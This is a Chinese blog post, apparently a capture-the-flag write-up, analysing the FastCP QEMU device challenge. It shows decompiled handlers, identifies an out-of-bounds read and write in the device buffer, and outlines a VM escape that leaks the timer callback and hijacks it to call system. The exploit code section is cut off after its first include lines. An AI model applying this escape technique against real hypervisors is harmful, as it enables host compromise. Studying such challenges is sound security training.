@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="196082">
+    
+    <title>
+        
+            QEMU逃逸练习 |
+        
+        196082&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/ufo.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ai.jpg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                196082&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">QEMU逃逸练习</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2023-03-21 15:57:03
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/qemu-escape/">qemu escape</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/mmio/">mmio</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pmio/">pmio</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>16 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。</p>
+<h2 id="FastCP-ctf"><a href="#FastCP-ctf" class="headerlink" title="FastCP-ctf"></a>FastCP-ctf</h2><p>关于设备的分析可以参考前面两篇文章，这里就不再赘述了。</p>
+<h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先就是read函数这里是非常常规的一些内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再就是write函数，可以修改<code>opaque-&gt;cp_state.cmd</code>、<code>opaque-&gt;cp_state.CP_list_cnt</code>、<code>opaque-&gt;cp_state.CP_list_src</code>，并且可以看到中间会触发timer。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// read</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// write</span></span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在timer中存在三个由cmd属性控制的分支，这里直接说三个分支的功能：</p>
+<ol>
+<li>  <code>opaque-&gt;cp_state.cmd = 2</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，通过<code>( cp_info.CP_cnt &lt;= 0x1000 )</code>验证之后再将<code>cp_info.CP_src</code>内容读取到<code>opaque-&gt;CP_buffer</code>上。</li>
+<li>  <code>opaque-&gt;cp_state.cmd = 4</code>; 从<code>opaque-&gt;cp_state.CP_list_src</code>读取内容到栈上，未通过任何验证，直接将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上</li>
+<li>  <code>opaque-&gt;cp_state.cmd = 1</code>; 从<code>opaque-&gt;cp_state.CP_list_src + 8 * v9</code>读取内容到栈上，未通过任何验证，将<code>cp_info.CP_src</code>读取到<code>opaque-&gt;CP_buffer</code>上，再将<code>opaque-&gt;CP_buffer</code>写到<code>cp_info.CP_dst</code>上。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCPState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A30</span>, align=<span class="number">0x10</span>, copyof_4530)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000008F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009E0</span> cp_state CP_state ?</span><br><span class="line"><span class="number">000009F</span>8 handling db ?</span><br><span class="line"><span class="number">000009F</span>9 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>A db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>B db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>C irq_status dd ?</span><br><span class="line"><span class="number">00000</span>A00 CP_buffer db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001</span>A00 cp_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00001</span>A30 FastCPState ends</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="number">00000000</span> QEMUTimer_0 struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1181)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> expire_time dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list dq ?                         ; offset</span><br><span class="line"><span class="number">00000010</span> cb dq ?                                 ; offset</span><br><span class="line"><span class="number">00000018</span> opaque dq ?                             ; offset</span><br><span class="line"><span class="number">00000020</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000028</span> attributes dd ?</span><br><span class="line"><span class="number">0000002</span>C scale dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0 ends</span><br></pre></td></tr></table></figure>
+
+<p>结合上述结构体再加上上面的分析结果漏洞已经呼之欲出了。因为情况2和3中没有对len进行验证导致可以越界使用结构体产生的漏洞。</p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>因为漏洞点较为简单，所以利用方式也比较简单</p>
+<ol>
+<li>  首先通过情况2越界读取到<code>cp_timer</code>成员中的内容。该成员中cb的值为<code>fastcp_cp_timer</code>函数的地址(在<code>pci_FastCP_realize</code>中完成赋值)，进而泄漏出system的地址。顺便泄漏出opaque成员地址。</li>
+<li>  通过情况3越界写入内容到<code>cp_timer</code>成员，劫持cb和opaque。</li>
+<li>  最后触发timer完成利用</li>
+</ol>
+<h4 id="注意！！"><a href="#注意！！" class="headerlink" title="注意！！"></a><strong>注意！！</strong></h4><p><strong>虽然利用方式特别简单，但是这道题目有一点是非常容易被忽略的。那就是物理地址连续不代表虚拟地址连续！</strong></p>
+<p>在下面exp中，在第一次读取到<code>cp_timer</code>成员到内容后并没有使用<code>*(unsigned long long *)(userbuf + 0x1010)</code>来读取，因为程序中实际写入到函数是<code>cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);</code>而这里写入到的是物理地址，但是物理地址并不连续，所以这里是读取不到的。所以最后往<code>cp_timer</code>成员写入的时候使用的也是<code>va2pa(userbuf + 0x1000) - 0x1000</code>写入。</p>
+<h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span 